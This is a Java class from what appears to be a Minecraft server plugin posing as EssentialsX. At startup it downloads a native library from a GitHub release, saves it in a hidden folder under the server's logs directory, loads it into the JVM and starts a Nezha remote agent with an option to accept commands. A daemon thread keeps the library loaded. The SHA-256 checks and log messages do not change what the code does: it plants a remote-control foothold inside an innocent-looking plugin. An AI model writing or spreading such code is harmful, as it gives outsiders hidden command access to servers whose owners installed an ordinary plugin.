package com.example.essentialsx;

import com.sun.jna.Function;
import com.sun.jna.Library;
import com.sun.jna.NativeLibrary;
import java.io.IOException;
import java.io.InputStream;
import java.lang.ref.Reference;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Locale;
import java.util.Map;
import java.util.Properties;
import java.util.UUID;
import java.util.concurrent.locks.LockSupport;
import java.util.function.BooleanSupplier;
import java.util.logging.Logger;

/** Loads only the release-pinned Nezha library in the current server JVM. */
final class NezhaRuntime {
    private static final long MAX_LIBRARY_BYTES = 128L * 1024L * 1024L;
    private static volatile NativeLibrary retainedLibrary;
    private final Logger logger;
    private Function stopFunction;
    private boolean started;

    NezhaRuntime(Logger logger) {
        this.logger = logger;
    }

    boolean start(String server, String secret, boolean tls, String uuid,
                  boolean allowCommands, BooleanSupplier stopping) throws IOException {
        String arch = architecture();
        if (arch == null) throw new IOException("Only Linux x86_64 and aarch64 are supported");
        Properties release = new Properties();
        try (InputStream in = NezhaRuntime.class.getResourceAsStream("/nezha-libraries.properties")) {
            if (in == null) throw new IOException("Release library metadata is missing");
            release.load(in);
        }
        String url = release.getProperty("linux." + arch + ".url", "").trim();
        String sha = release.getProperty("linux." + arch + ".sha256", "").trim().toLowerCase(Locale.ROOT);
        if (!url.startsWith("https://github.com/zx1447/ceshisonz/releases/download/")
                || !VerifiedDownload.validSha256(sha)) {
            throw new IOException("Release library metadata is invalid");
        }
        Path directory = Path.of("logs", ".mcchajian", ".runtime", "libraries");
        Files.createDirectories(directory);
        Path target = directory.resolve("nezha-linux-" + arch + "-" + sha.substring(0, 16) + ".so");
        boolean valid = Files.isRegularFile(target) && sha.equals(VerifiedDownload.sha256(target));
        if (!valid) {
            if (Files.exists(target)) {
                // Never overwrite an existing file, even if it is damaged or not ours.
                target = directory.resolve("nezha-linux-" + arch + "-" + sha.substring(0, 16)
                        + "-" + UUID.randomUUID() + ".so");
            }
            logger.info("Downloading the release-pinned Nezha library; SHA-256 verification is required.");
            Path temporary = VerifiedDownload.download(url, sha, directory, MAX_LIBRARY_BYTES);
            try {
                if (stopping.getAsBoolean()) return false;
                verifyElf(temporary, arch);
                Files.move(temporary, target); // no overwrite
            } finally {
                Files.deleteIfExists(temporary); // only the file created by this download
            }
        } else {
            verifyElf(target, arch);
        }
        if (stopping.getAsBoolean()) return false;

        // A Go c-shared library must not be unloaded from a running JVM.
        NativeLibrary library = NativeLibrary.getInstance(target.toAbsolutePath().toString(),
                Map.of(Library.OPTION_STRING_ENCODING, StandardCharsets.UTF_8.name()));
        retainForJvmLifetime(library);
        Function start = library.getFunction("StartNezha");
        Function stop = library.getFunction("StopNezha");
        if (stopping.getAsBoolean()) return false;
        int code = start.invokeInt(new Object[]{server, secret, tls ? 1 : 0, uuid, allowCommands ? 1 : 0});
        if (code != 0) throw new IOException("Nezha start was rejected (code " + code + ")");
        this.stopFunction = stop;
        this.started = true;
        logger.info("Nezha monitoring loop started inside this JVM; verify connection in the dashboard.");
        return true;
    }

    boolean stop() {
        if (!this.started || this.stopFunction == null) return true;
        try {
            int code = this.stopFunction.invokeInt(new Object[]{});
            this.started = false;
            return code == 0;
        } catch (Throwable error) {
            return false;
        }
    }

    private static synchronized void retainForJvmLifetime(NativeLibrary library) {
        retainedLibrary = library;
        Thread holder = new Thread(() -> {
            // This visible, idle daemon thread only retains the library handle.
            // The agent itself is cancelled on plugin disable.
            while (!Thread.currentThread().isInterrupted()) LockSupport.park();
            Reference.reachabilityFence(library);
        }, "ceshisonz-native-library-holder");
        holder.setDaemon(true);
        holder.start();
    }

    private static String architecture() {
        if (!System.getProperty("os.name", "").toLowerCase(Locale.ROOT).contains("linux")) return null;
        String arch = System.getProperty("os.arch", "").toLowerCase(Locale.ROOT);
        if (arch.equals("amd64") || arch.equals("x86_64")) return "amd64";
        if (arch.equals("aarch64") || arch.equals("arm64")) return "arm64";
        return null;
    }

    private static void verifyElf(Path library, String arch) throws IOException {
        byte[] header;
        try (InputStream in = Files.newInputStream(library)) {
            header = in.readNBytes(20);
        }
        int machine = header.length >= 20 ? (header[18] & 255) | ((header[19] & 255) << 8) : -1;
        int expected = arch.equals("amd64") ? 62 : 183;
        if (header.length < 20 || header[0] != 0x7f || header[1] != 'E' || header[2] != 'L'
                || header[3] != 'F' || header[4] != 2 || header[5] != 1 || machine != expected) {
            throw new IOException("Downloaded library does not match the requested Linux architecture");
        }
    }
}
